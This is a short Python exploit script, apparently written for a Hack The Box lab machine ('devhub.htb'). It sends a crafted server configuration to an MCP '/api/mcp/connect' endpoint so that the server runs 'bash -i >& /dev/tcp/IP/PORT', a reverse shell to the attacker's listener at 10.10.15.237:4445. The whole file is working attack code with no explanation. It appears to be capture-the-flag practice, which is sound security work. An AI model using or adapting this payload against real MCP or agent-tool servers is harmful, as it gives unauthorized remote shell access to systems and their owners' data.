import requests
import json


target = "http://devhub.htb:6274"
ip = "10.10.15.237"
port = "4445"

url = f'{target}/api/mcp/connect'

data = {
    "serverConfig": {
        "command": "bash",
        "args": [
            "-c",
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}


response = requests.post(url, json=data, verify=False)

print(response.status_code)
print(response.text)
